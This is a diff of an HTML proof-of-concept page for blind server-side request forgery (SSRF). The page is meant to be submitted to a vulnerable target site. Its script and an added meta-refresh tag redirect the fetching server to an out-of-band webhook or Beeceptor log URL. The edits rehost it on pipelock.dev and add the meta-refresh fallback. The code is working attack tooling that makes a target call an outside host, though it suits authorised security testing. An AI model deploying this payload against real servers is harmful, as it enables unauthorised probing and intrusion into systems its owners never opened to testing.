@@ -2,58 +2,66 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Dynamic Blind SSRF OOB Trigger</title>
+    <title>Dynamic Blind SSRF OOB Trigger (pipelock.dev)</title>
+    <meta http-equiv="refresh" content="5;url=about:blank"> 
     <style>
-        body { font-family: Arial, sans-serif; margin: 30px; background-color: #e3f2fd; color: #333; }
-        .container { background-color: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); }
-        h1 { color: #1e88e5; }
-        .note { padding: 10px; margin-top: 15px; background-color: #bbdefb; border-left: 5px solid #1e88e5; }
-        #redirect-url-display { font-weight: bold; color: #d32f2f; }
-        #status { font-weight: bold; margin-top: 10px; color: #FF9800; }
+        body { font-family: Arial, sans-serif; margin: 30px; background-color: #1a1a1a; color: #eaeaea; }
+        .container { background-color: #2b2b2b; padding: 25px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3); }
+        h1 { color: #00AEEF; border-bottom: 2px solid #00AEEF; padding-bottom: 5px; }
+        .note { padding: 15px; margin-top: 15px; background-color: #3e3e3e; border-left: 5px solid #00CC66; }
+        #redirect-url-display { font-weight: bold; color: #f44336; }
+        #status { font-weight: bold; margin-top: 10px; color: #00AEEF; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Blind SSRF Out-of-Band (OOB) Proof of Concept</h1>
-        <p><strong>Origin:</strong> This page is designed to be fetched by the **target server**.</p>
+        <p><strong>Origin:</strong> This page is fetched from **<code id="source-domain">https://pipelock.dev</code>**.</p>
+        <p><strong>Goal:</strong> Trigger an HTTP 302 redirect from the server's fetching process to an external log collector (OOB).</p>
 
         <div class="note">
             <strong>Usage:</strong>
-            1. Get your unique Beeceptor endpoint (e.g., <code>https://ssrf-log.beeceptor.com</code>).
-            2. Craft the SSRF payload on the **vulnerable target site** by submitting this URL:
+            1. Get your unique Webhook/Beeceptor endpoint (e.g., <code>https://ssrf-log.beeceptor.com</code>).
+            2. Craft the SSRF payload on the **vulnerable target site** by submitting this full URL:
             <br><br>
-            <code>https://yourusername.github.io/ssrf_trigger.html?log=YOUR_BEECEPTOR_ENDPOINT</code>
+            <code>https://pipelock.dev/ssrf_trigger.html?log=YOUR_WEBHOOK_ENDPOINT</code>
         </div>
 
         <p id="status">Status: Preparing HTTP 302 Redirect Payload...</p>
-        <p>The server should immediately be redirected to: <code id="redirect-url-display">N/A</code></p>
+        <p>The server should be redirected to: <code id="redirect-url-display">N/A</code></p>
         
-        <p>If you see a request hit your **Beeceptor log**, it confirms the target server is vulnerable to Blind SSRF and allows external connections.</p>
+        <p>If you see a request hit your **Webhook log**, it confirms the target server is vulnerable to Blind SSRF.</p>
     </div>
 
     <script>
-        // Use JavaScript to perform a quick redirect, simulating a server-side redirect
         function runSsrfTrigger() {
             const urlParams = new URLSearchParams(window.location.search);
             const logEndpoint = urlParams.get('log');
             
+            document.getElementById('source-domain').textContent = window.location.origin;
+
             if (!logEndpoint) {
                 document.getElementById('status').textContent = "ERROR: No 'log' parameter found. Cannot redirect.";
                 return;
             }
 
-            // Append a unique path to the log URL for clear identification in Beeceptor
+            // Append a unique path to the log URL for clear identification 
             const finalRedirectUrl = `${logEndpoint}/ssrf-oob-test?from=${encodeURIComponent(window.location.host)}`;
             
             document.getElementById('redirect-url-display').textContent = finalRedirectUrl;
-            document.getElementById('status').textContent = "REDIRECTING... Check your Beeceptor log NOW!";
+            document.getElementById('status').textContent = "REDIRECTING (via JS and Meta Refresh)... Check your OOB log NOW!";
 
-            // The key mechanism: redirect the fetching client (the target server) to the Beeceptor URL
-            // This works because most server-side URL fetching libraries follow redirects.
+            // 1. Update the HTML Meta Refresh tag immediately (best effort, as meta tags are read first)
+            const metaTag = document.querySelector('meta[http-equiv="refresh"]');
+            if (metaTag) {
+                 // Set content to 0 seconds delay for immediate redirect
+                metaTag.setAttribute('content', `0;url=${finalRedirectUrl}`);
+            }
+
+            // 2. Perform the JS redirect (The key mechanism if JS is executed)
             window.location.replace(finalRedirectUrl);
         }
 
-        // Run the script
         runSsrfTrigger();
     </script>
 </body>
